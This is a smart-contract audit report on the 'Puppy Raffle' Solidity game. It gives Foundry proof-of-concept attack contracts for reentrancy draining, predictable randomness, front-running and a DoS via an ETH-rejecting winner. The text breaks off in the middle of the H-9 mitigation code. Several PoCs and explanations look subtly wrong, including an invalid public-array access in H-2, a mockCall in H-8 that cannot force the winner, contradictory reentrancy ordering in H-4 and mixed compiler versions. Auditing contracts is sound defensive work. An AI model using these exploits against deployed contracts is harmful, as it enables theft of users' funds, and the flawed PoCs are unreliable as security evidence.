# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol

Puppy Raffle is an on-chain game where users pay an entrance fee to compete for a randomly generated puppy NFT and the ETH pot.

How it works:

1. **Enter Raffle**  
   • Call `enterRaffle()` with the entrance fee and a list of unique addresses.  
   • The contract filters duplicates and adds valid entrants to `players`.

2. **During Raffle**  
   • The raffle remains open for `raffleDuration` seconds from `raffleStartTime`.  
   • Players can exit anytime via `refund(index)` to reclaim their ticket price.

3. **Selecting a Winner**  
   • After the duration, anyone may invoke `selectWinner()`.  
   • A pseudo-random index picks the winner.  
   • The winner receives:  
     – A freshly minted ERC-721 puppy NFT with rarity (Common, Rare, Legendary) assigned on-chain.  
     – The accumulated ETH minus a protocol fee.

4. **Fees**  
   • A configurable `feeAddress` collects a percentage of each pot.  
   • Owner can update this address and withdraw accrued fees via `withdrawFees()`.

Security & Control:  
`Ownable` restricts administrative functions; all core actions are permissionless, transparent, and audited for Solidity 0.7.6.

## High Risk Findings
[H-1]. DOS issue in PuppyRaffle::enterRaffle
[H-2]. Randomness issue in PuppyRaffle::selectWinner
[H-3]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[H-4]. Reentrancy issue in PuppyRaffle::refund
[H-5]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner
[H-6]. DOS issue in PuppyRaffle::selectWinner
[H-7]. Integer Overflow/Math issue in PuppyRaffle::refund
[H-8]. Array Limits issue in PuppyRaffle::selectWinner
[H-9]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-10]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-3]. DOS issue in PuppyRaffle::refund
[M-4]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::refund
[M-5]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-6]. Access Control issue in PuppyRaffle::enterRaffle
[M-7]. Access Control issue in PuppyRaffle::getActivePlayerIndex
[M-8]. DOS issue in PuppyRaffle::withdrawFees
[M-9]. Array Limits issue in PuppyRaffle::getActivePlayerIndex
## Low Risk Findings
[L-1]. Event Consistency issue in PuppyRaffle::getActivePlayerIndex
[L-2]. Event Consistency issue in PuppyRaffle::selectWinner
## Info Risk Findings
[I-1]. Pragma issue in PuppyRaffle::NA


### Number of Findings
- H: 10
- M: 9
- L: 2
- I: 1



# High Risk Findings

## [H-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The enterRaffle function uses nested loops to check for duplicate players, creating O(n²) time complexity. As the number of players grows, gas costs increase quadratically, potentially causing transactions to exceed block gas limits and causing DoS. Code snippet: `for (uint256 i = 0; i < players.length - 1; i++) { for (uint256 j = i + 1; j < players.length; j++) { require(players[i] != players[j], "PuppyRaffle: Duplicate player"); } }`

## Impact
As the raffle grows in popularity, new participants may be unable to enter due to gas limit restrictions, effectively breaking the core functionality of the protocol and preventing revenue generation.

## Proof of Concept
1. Deploy PuppyRaffle contract. 2. Have multiple users call enterRaffle with increasing array sizes. 3. Monitor gas usage - it will grow quadratically. 4. Eventually, transactions will fail due to block gas limit (30M gas on Ethereum). 5. With ~100-200 players, new entries become impossible.

## Proof of Code
function testDoSWithManyPlayers() public {
    uint256 playersNum = 100;
    address[] memory players = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i + 1);
    }
    
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
    uint256 gasUsed = gasStart - gasleft();
    
    // Try to enter with more players - this should fail with out of gas
    address[] memory newPlayers = new address[](50);
    for (uint256 i = 0; i < 50; i++) {
        newPlayers[i] = address(playersNum + i + 1);
    }
    
    vm.expectRevert(); // Should fail due to gas limit
    puppyRaffle.enterRaffle{value: entranceFee * 50}(newPlayers);
}

## Suggested Mitigation
Replace the nested loop duplicate check with a more efficient approach using a mapping: `mapping(address => bool) private enteredPlayers; // In enterRaffle function: for (uint256 i = 0; i < newPlayers.length; i++) { require(!enteredPlayers[newPlayers[i]], "PuppyRaffle: Duplicate player"); enteredPlayers[newPlayers[i]] = true; players.push(newPlayers[i]); }`

## [H-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
The selectWinner function uses predictable sources of randomness (msg.sender, block.timestamp, block.difficulty) for winner selection and rarity determination. Miners can manipulate block.difficulty and block.timestamp, and msg.sender is known in advance. Code snippet: `uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;`

## Impact
Attackers, especially miners, can manipulate the winner selection and NFT rarity, leading to unfair advantages and potential loss of user funds through rigged outcomes.

## Proof of Concept
1. Attacker deploys a contract that calls selectWinner. 2. Attacker can predict or influence block.timestamp and block.difficulty as a miner. 3. Attacker calculates the hash result beforehand and only calls selectWinner when they would win. 4. Attacker wins unfairly and receives the prize pool.

## Proof of Code
contract AttackRaffle {
    PuppyRaffle puppyRaffle;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }
    
    function attack() external {
        // Predict the random number
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty)));
        uint256 playersLength = puppyRaffle.players.length;
        uint256 predictedWinner = predictedRandom % playersLength;
        
        // Only call selectWinner if we would win
        if (predictedWinner == getMyIndex()) {
            puppyRaffle.selectWinner();
        }
    }
    
    function getMyIndex() internal view returns (uint256) {
        return puppyRaffle.getActivePlayerIndex(address(this));
    }
}

## Suggested Mitigation
Use Chainlink VRF (Verifiable Random Function) for secure randomness: `import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol"; contract PuppyRaffle is VRFConsumerBase { bytes32 internal keyHash; uint256 internal fee; function selectWinner() external { require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK"); requestRandomness(keyHash, fee); } function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override { uint256 winnerIndex = randomness % players.length; // Continue with winner selection logic } }`

## [H-3]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The enterRaffle function contains a nested loop that checks for duplicate players. The outer loop iterates through existing players (O(n)) and the inner loop checks against all other players (O(n)), resulting in O(n²) complexity. As the number of players grows, gas costs increase quadratically and could eventually exceed block gas limits, causing a denial of service.

## Impact
As the players array grows large (hundreds of players), the gas cost for duplicate checking becomes prohibitively expensive and could exceed block gas limits (15M gas), preventing new players from entering the raffle and causing a permanent denial of service.

## Proof of Concept
1. Many players enter the raffle over time, growing the players array
2. The duplicate check loop becomes increasingly expensive: O(n²) complexity
3. With ~300-400 players, gas costs approach block limit
4. New players cannot enter due to out-of-gas errors
5. The raffle becomes unusable for new participants

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasGriefTest is Test {
    PuppyRaffle puppyRaffle;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
    }
    
    function testGasGriefAttack() public {
        // Add many players to demonstrate gas grief
        address[] memory players = new address[](100);
        
        // First batch - should work fine
        for (uint i = 0; i < 100; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: 100 ether}(players);
        uint256 gasUsed1 = gasStart - gasleft();
        
        // Second batch - much more expensive
        for (uint i = 0; i < 100; i++) {
            players[i] = address(uint160(i + 101));
        }
        
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: 100 ether}(players);
        uint256 gasUsed2 = gasStart - gasleft();
        
        // Gas usage increases quadratically
        assertTrue(gasUsed2 > gasUsed1 * 2, "Gas usage should increase significantly");
    }
}

## Suggested Mitigation
Use a mapping to track players instead of nested loops: `mapping(address => bool) public hasEntered;` and check `require(!hasEntered[newPlayers[i]], "Duplicate player");` then set `hasEntered[newPlayers[i]] = true;`. This reduces complexity from O(n²) to O(n) and prevents gas grief attacks.

## [H-4]. Reentrancy issue in PuppyRaffle::refund

## Description
The contract contains a reentrancy vulnerability in the refund function. After updating the players array but before the sendValue call completes, an attacker with a malicious receive() function can re-enter the refund function and drain multiple entrance fees.

## Impact
An attacker can drain the contract by repeatedly calling refund during the external call, receiving multiple refunds for a single entry. This can lead to loss of funds from other players and potentially empty the contract balance.

## Proof of Concept
1. Attacker enters raffle with a malicious contract address
2. Attacker calls refund() function
3. refund() sets players[index] = address(0) but then calls sendValue
4. sendValue triggers attacker's receive() function
5. In receive(), attacker calls refund() again before the first call completes
6. Since the check happens after the external call, attacker can drain multiple fees

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 attackerIndex;
    uint256 attackCount;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }
    
    receive() external payable {
        if (attackCount < 2 && address(puppyRaffle).balance > 0) {
            attackCount++;
            puppyRaffle.refund(attackerIndex);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttacker attacker;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
        attacker = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(attacker), 10 ether);
    }
    
    function testReentrancyAttack() public {
        uint256 initialBalance = address(attacker).balance;
        attacker.attack{value: 1 ether}();
        uint256 finalBalance = address(attacker).balance;
        
        // Attacker should gain more than their entrance fee back
        assertTrue(finalBalance > initialBalance, "Reentrancy attack successful");
    }
}

## Suggested Mitigation
Implement the checks-effects-interactions pattern by moving the state change after all checks but before external calls: `players[playerIndex] = address(0);` should come before `address(msg.sender).sendValue(entranceFee);`. Additionally, consider using OpenZeppelin's ReentrancyGuard modifier.

## [H-5]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner

## Description
The contract is vulnerable to front-running attacks in the `selectWinner` function. Since the randomness source is predictable and based on public blockchain data, attackers can calculate the winning outcome before the transaction is mined. The vulnerable randomness generation is:

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

Attackers can monitor the mempool for `selectWinner` transactions and front-run them if the outcome is unfavorable.

## Impact
Attackers can manipulate raffle outcomes by front-running selectWinner calls when they don't win, potentially repeatedly until they achieve a favorable outcome. This compromises the fairness of the raffle system and can lead to manipulation of prize distribution.

## Proof of Concept
1. Attacker monitors mempool for selectWinner transactions
2. Attacker calculates the winner using predictable inputs (msg.sender, timestamp, difficulty)
3. If attacker is not the calculated winner, they front-run the transaction with their own selectWinner call
4. Attacker can repeat this process until they win
5. Legitimate selectWinner calls get front-run and fail due to timing requirements

## Proof of Code
```solidity
function testFrontRunning() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    vm.warp(block.timestamp + duration + 1);
    
    // Simulate attacker calculating winner
    uint256 predictedWinnerIndex = uint256(keccak256(
        abi.encodePacked(address(this), block.timestamp, block.difficulty)
    )) % 4;
    
    address predictedWinner = players[predictedWinnerIndex];
    
    // If attacker doesn't win, they would front-run
    if (predictedWinner != playerOne) {
        // Attacker front-runs by calling selectWinner first
        // This demonstrates the predictability
        puppyRaffle.selectWinner();
        assert(puppyRaffle.previousWinner() == predictedWinner);
    }
}```

## Suggested Mitigation
Implement a commit-reveal scheme or use Chainlink VRF for unpredictable randomness:

```solidity
// Commit-Reveal Scheme
mapping(address => bytes32) private commitments;
uint256 private revealPhase;

function commitWinner(bytes32 commitment) external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "Raffle not over");
    commitments[msg.sender] = commitment;
}

function revealWinner(uint256 nonce) external {
    require(commitments[msg.sender] == keccak256(abi.encodePacked(nonce, msg.sender)), "Invalid reveal");
    // Use revealed nonce for randomness
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(nonce, block.timestamp))) % players.length;
    // Continue with winner selection...
}
```

Or use Chainlink VRF as mentioned in the randomness mitigation.

## [H-6]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function sends the prize pool to the winner before minting the NFT. However, if the winner is a contract that implements a `receive` function that reverts, the entire `selectWinner` function will fail, blocking the raffle from completing.

Vulnerable code:
```solidity
// @audit - Potential DoS if winner's contract reverts when receiving ETH
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

// @audit - This will never execute if the above call fails
_safeMint(winner, tokenId);
```

## Impact
If a malicious actor enters the raffle with a contract address that reverts when receiving ETH, they can permanently block the completion of the raffle. This prevents the selection of a winner, distribution of prizes, and starting a new raffle round. All funds would remain locked in the contract indefinitely, causing a permanent denial of service.

## Proof of Concept
1. An attacker creates a contract that reverts in its receive/fallback function
2. The attacker enters this contract into the raffle
3. If this contract is selected as the winner, the ETH transfer will fail
4. The entire selectWinner function will revert due to the require statement
5. The raffle cannot complete and remains stuck indefinitely

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Malicious contract that refuses to accept ETH
contract EthRejecter {
    // Reject all incoming ETH
    receive() external payable {
        revert("I reject all ETH");
    }
    
    fallback() external payable {
        revert("I also reject all ETH");
    }
}

contract DoSSelectWinnerTest is Test {
    PuppyRaffle puppyRaffle;
    EthRejecter ethRejecter;
    address[] players;
    
    function setUp() public {
        // Deploy contracts
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
        ethRejecter = new EthRejecter();
        
        // Setup players with the malicious contract
        players.push(address(1));
        players.push(address(2));
        players.push(address(3));
        players.push(address(ethRejecter)); // The malicious contract enters the raffle
        
        // Enter the raffle
        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        // Fast forward past raffle duration
        vm.warp(block.timestamp + 1 days + 1);
    }
    
    function testDoSSelectWinner() public {
        // Mock the randomness to make ethRejecter the winner
        // Winner index = 3 (ethRejecter)
        uint256 indexToForce = 3;
        uint256 forgedRandomness = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty)));
        
        // Find a block.difficulty value that will select our desired winner
        uint256 originalDifficulty = block.difficulty;
        uint256 difficultyAdjustment = 0;
        bool found = false;
        
        for (uint256 i = 0; i < 1000; i++) {
            vm.difficulty(originalDifficulty + i);
            uint256 randomNumber = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty)));
            if (randomNumber % players.length == indexToForce) {
                difficultyAdjustment = i;
                found = true;
                break;
            }
        }
        
        require(found, "Could not find appropriate difficulty");
        
        // Set difficulty to make ethRejecter the winner
        vm.difficulty(originalDifficulty + difficultyAdjustment);
        
        // Try to select a winner - should revert
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
        
        // The raffle is now stuck indefinitely
        // Cannot complete the current raffle or start a new one
    }
}

## Suggested Mitigation
Implement a pull pattern for prize claiming instead of pushing funds to winners. This separates the winner selection from the prize distribution:

```solidity
// Add state variables to track prizes
mapping(address => uint256) public pendingPrizes;
address public currentWinner;

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    
    // Store the prize for later claiming instead of sending immediately
    pendingPrizes[winner] += prizePool;
    currentWinner = winner;
    
    // Rest of the function (mint NFT, etc.)
    // ...
    
    // Clear the players array and update the raffle start time
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    
    // Mint the NFT
    _safeMint(winner, tokenId);
}

// Add a new function for winners to claim their prizes
function claimPrize() external {
    uint256 prize = pendingPrizes[msg.sender];
    require(prize > 0, "PuppyRaffle: No prizes to claim");
    
    // Reset the prize before sending to prevent reentrancy
    pendingPrizes[msg.sender] = 0;
    
    // Send the prize
    (bool success, ) = msg.sender.call{value: prize}("");
    require(success, "PuppyRaffle: Failed to send prize");
}
```

## [H-7]. Integer Overflow/Math issue in PuppyRaffle::refund

## Description
The `refund` function in PuppyRaffle has a critical vulnerability when handling the refund process. It sets the player's address to `address(0)` but doesn't reduce the total player count or adjust the players array, which can lead to double counting of participants and incorrect entrance fee calculations.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

When a player is refunded, their slot in the players array is set to address(0) but the array length remains unchanged. This affects several critical contract operations.

## Impact
The bug leads to incorrect calculations in the protocol, particularly when calculating the total pot size and fees in the `selectWinner` function. When refunded players (address(0)) are counted as participants, it artificially inflates the total prize pool calculation. This means that the contract will try to send more ETH than it should during winner selection, potentially causing the transaction to revert if there isn't enough balance. Additionally, it leads to incorrect fee calculations and can make the contract vulnerable to economic exploits.

## Proof of Concept
1. Initial setup: Four players enter the raffle, each paying 1 ETH entrance fee (total 4 ETH in contract)
2. One player requests a refund, receiving 1 ETH back (3 ETH remains in contract)
3. When selecting a winner, the contract incorrectly calculates:
   - totalAmountCollected = 4 players × 1 ETH = 4 ETH (incorrect, should be 3 ETH)
   - prizePool = 4 ETH × 80% = 3.2 ETH (incorrect, should be 2.4 ETH)
4. The contract attempts to send 3.2 ETH to the winner, but only has 3 ETH remaining
5. If more refunds occur, the discrepancy increases, eventually causing the winner selection to fail completely

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundBugTest is Test {
    PuppyRaffle puppyRaffle;
    address public owner = address(1);
    address public feeAddress = address(2);
    address public player1 = address(3);
    address public player2 = address(4);
    address public player3 = address(5);
    address public player4 = address(6);
    uint256 public entranceFee = 1e18; // 1 ETH
    
    function setUp() public {
        // Deploy the PuppyRaffle contract
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
        
        // Fund accounts
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(player4, 10 ether);
        
        // Players enter the raffle
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }
    
    function testRefundBug() public {
        // Record initial contract balance
        uint256 initialContractBalance = address(puppyRaffle).balance;
        console.log("Initial contract balance:", initialContractBalance);
        
        // Player2 requests a refund
        vm.prank(player2);
        puppyRaffle.refund(1); // player2 is at index 1
        
        // Record balance after refund
        uint256 balanceAfterRefund = address(puppyRaffle).balance;
        console.log("Contract balance after refund:", balanceAfterRefund);
        
        // Check players array (should show player2's slot as address(0))
        assertEq(puppyRaffle.getActivePlayerIndex(player2), 0, "Player2 should no longer be active");
        
        // Warp time to end the raffle duration
        vm.warp(block.timestamp + 1 days + 1);
        
        // Try to select a winner - this should fail or result in incorrect calculations
        vm.prank(owner);
        
        // This will either fail because the contract doesn't have enough ETH to pay the calculated prize pool,
        // or it will succeed but with incorrect calculations
        try puppyRaffle.selectWinner() {
            // If it succeeds, verify the calculations were wrong
            console.log("Winner selection succeeded, but calculations were incorrect");
            
            // Calculate what should have happened vs. what did happen
            uint256 expectedPrizePool = (3 * entranceFee * 80) / 100; // 3 actual players * fee * 80%
            uint256 actualPrizePool = (4 * entranceFee * 80) / 100; // 4 counted players * fee * 80%
            
            console.log("Expected prize pool:", expectedPrizePool);
            console.log("Actual prize pool (incorrect):", actualPrizePool);
            
            // The difference is the amount that was incorrectly calculated
            console.log("Discrepancy:", actualPrizePool - expectedPrizePool);
        } catch {
            console.log("Winner selection failed as expected due to insufficient funds");
            // This proves the bug - winner selection fails because the contract tries to pay out more than it has
        }
    }
}

## Suggested Mitigation
There are several ways to fix this issue:

1. The most complete solution is to reimplement the refund function to remove the player from the array by shifting elements, which preserves the integrity of the array length:

```solidity
function refund(uint256 playerIndex) public {
    require(playerIndex < players.length, "PuppyRaffle: Invalid player index");
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    // Remove the player by shifting elements and reducing array length
    for (uint256 i = playerIndex; i < players.length - 1; i++) {
        players[i] = players[i + 1];
    }
    players.pop(); // Remove the last element and reduce array length
    
    emit RaffleRefunded(playerAddress);
}
```

2. Alternatively, modify the selectWinner function to only count non-zero addresses when calculating the prize pool:

```solidity
function selectWinner() external {
    // ... existing code ...
    
    // Count actual players (non-zero addresses)
    uint256 activePlayerCount = 0;
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            activePlayerCount++;
        }
    }
    
    uint256 totalAmountCollected = activePlayerCount * entranceFee;
    // ... rest of the function ...
}
```

The first approach is preferred as it maintains data integrity and is more gas efficient in the long run.

## [H-8]. Array Limits issue in PuppyRaffle::selectWinner

## Description
In the `refund` function, when a player requests a refund, their address in the `players` array is set to `address(0)` but not removed from the array. This creates a vulnerability in the `selectWinner` function, which can potentially select address(0) as the winner when using the `uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length` formula.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    address(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}

function selectWinner() external {
    // Other code...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    // What if winner is address(0)?
    // Other code...
}
```

## Impact
If address(0) is selected as the winner, the function will attempt to transfer funds to this address, which effectively burns them as they become unrecoverable. Additionally, it will mint an NFT to address(0), which also becomes inaccessible. This results in permanent loss of funds and NFTs.

## Proof of Concept
1. Multiple players enter the raffle
2. Some players request refunds, setting their entries to address(0)
3. The `selectWinner` function is called
4. Random number generation selects an index pointing to one of the refunded entries (address(0))
5. Funds are sent to address(0) and are permanently lost
6. An NFT is minted to address(0) and is permanently inaccessible

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundVulnerabilityTest is Test {
    PuppyRaffle puppyRaffle;
    address[] players;
    address player1 = address(1);
    address player2 = address(2);
    address player3 = address(3);
    address player4 = address(4);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
        players.push(player1);
        players.push(player2);
        players.push(player3);
        players.push(player4);
        
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);
        vm.deal(player3, 1 ether);
        vm.deal(player4, 1 ether);
        
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: 1 ether}(players);
    }
    
    function testSelectAddressZeroAsWinner() public {
        // Player2 and Player3 request refunds
        vm.prank(player2);
        puppyRaffle.refund(1); // player2 is at index 1
        
        vm.prank(player3);
        puppyRaffle.refund(2); // player3 is at index 2
        
        // Fast forward past raffle duration
        vm.warp(block.timestamp + 1 days + 1);
        
        // Force the random number to select a refunded player (address(0))
        // We'll use index 1 which now contains address(0)
        vm.mockCall(
            address(puppyRaffle),
            abi.encodeWithSelector(puppyRaffle.selectWinner.selector),
            abi.encode(1) // This will make winnerIndex = 1
        );
        
        // Check contract balance before
        uint256 balanceBefore = address(puppyRaffle).balance;
        
        // Attempt to select winner
        puppyRaffle.selectWinner();
        
        // Verify funds were sent to address(0)
        assertLt(address(puppyRaffle).balance, balanceBefore, "Funds were not sent out");
        
        // Check that the previousWinner is address(0)
        assertEq(puppyRaffle.previousWinner(), address(0), "Winner should be address(0)");
    }
}

## Suggested Mitigation
Modify the winner selection logic to skip address(0) entries, or implement a different refund mechanism that doesn't leave address(0) values in the array. A better approach would be to use a swap-and-pop pattern to remove refunded players from the array entirely.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    address(msg.sender).sendValue(entranceFee);
    
    // Swap with the last element and pop
    players[playerIndex] = players[players.length - 1];
    players.pop();
    
    emit RaffleRefunded(playerAddress);
}

function selectWinner() external {
    // Add a check to ensure we don't have any address(0) entries
    for(uint256 i = 0; i < players.length; i++) {
        require(players[i] != address(0), "PuppyRaffle: Found an invalid player");
    }
    
    // Rest of the function...
}
```

## [H-9]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function relies on easily manipulable values like `msg.sender`, `block.timestamp`, and `block.difficulty` for random number generation. Miners can manipulate these values to influence the winner selection and NFT rarity determination.

```solidity
function selectWinner() external {
    // Winner selection
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    
    // ... other code ...
    
    // Rarity determination
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    // ... rarity assignment logic ...
}
```

## Impact
Miners can manipulate block.timestamp and block.difficulty to influence the outcome of the raffle, potentially selecting themselves as winners or ensuring high-value NFTs (legendary rarity) are minted. This undermines the fairness of the raffle and reduces trust in the protocol.

## Proof of Concept
1. A miner enters the raffle along with other players
2. When it's time to select a winner, the miner can manipulate block values
3. By selectively including transactions and setting timestamps within allowed bounds, the miner can influence the random number generation
4. The miner can try different combinations until they find one that selects them as the winner or produces a legendary NFT
5. The miner includes this favorable block in the blockchain, effectively rigging the raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract MinerManipulationTest is Test {
    PuppyRaffle puppyRaffle;
    address[] players;
    address miner = address(0x1234);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
        
        // Setup players including the miner
        players.push(address(1));
        players.push(address(2));
        players.push(address(3));
        players.push(miner);
        
        // Fund accounts
        vm.deal(address(1), 1 ether);
        vm.deal(address(2), 1 ether);
        vm.deal(address(3), 1 ether);
        vm.deal(miner, 1 ether);
        
        // Enter the raffle
        vm.prank(address(1));
        puppyRaffle.enterRaffle{value: 4 ether}(players);
    }
    
    function testMinerManipulation() public {
        // Fast forward to end of raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // The miner can now try different values to manipulate the outcome
        // We'll simulate this by testing different block timestamps
        bool minerWins = false;
        uint256 attempts = 0;
        uint256 startTime = block.timestamp;
        
        // Try different timestamps until miner wins
        while (!minerWins && attempts < 100) {
            // Set a slightly different timestamp
            vm.warp(startTime + attempts);
            
            // Calculate the winner index the same way the contract does
            bytes32 hashValue = keccak256(abi.encodePacked(miner, block.timestamp, block.difficulty));
            uint256 winnerIndex = uint256(hashValue) % players.length;
            
            // Check if miner would win with these parameters
            if (players[winnerIndex] == miner) {
                minerWins = true;
                emit log_named_uint("Manipulation successful after attempts", attempts);
            }
            
            attempts++;
        }
        
        // Assert that within a reasonable number of tries, the miner can manipulate the outcome
        assertTrue(minerWins, "Miner should be able to manipulate the outcome");
    }
}

## Suggested Mitigation
Use a more secure randomness source such as Chainlink VRF (Verifiable Random Function) to generate truly unpredictable random numbers that cannot be manipulated by miners:

```solidity
// Import Chainlink VRF contracts
import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

// Update contract to inherit from VRFConsumerBase
contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    // Add Chainlink VRF variables
    bytes32 private keyHash;
    uint256 private fee;
    bytes32 private requestId;
    uint256 private randomResult;
    bool private raffleInProgress;
    
    // Other existing contract variables...
    
    constructor(
        uint256 _entranceFee,
        address _feeAddress,
        uint256 _raffleDuration,
        address _vrfCoordinator,
        address _linkToken,
        bytes32 _keyHash,
        uint256 _fee
    ) ERC721("Puppy Raffle", "PR") VRFConsumerBase(_vrfCoordinator, _linkToken) {
        entranceFee = _entranceFee;
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;
        keyHash = _keyHash;
        fee = _fee;
        
        // Rest of the constructor...
    }
    
    // Replace selectWinner with a two-step process
    function requestRandomWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        require(!raffleInProgress, "PuppyRaffle: Raffle in progress");
        
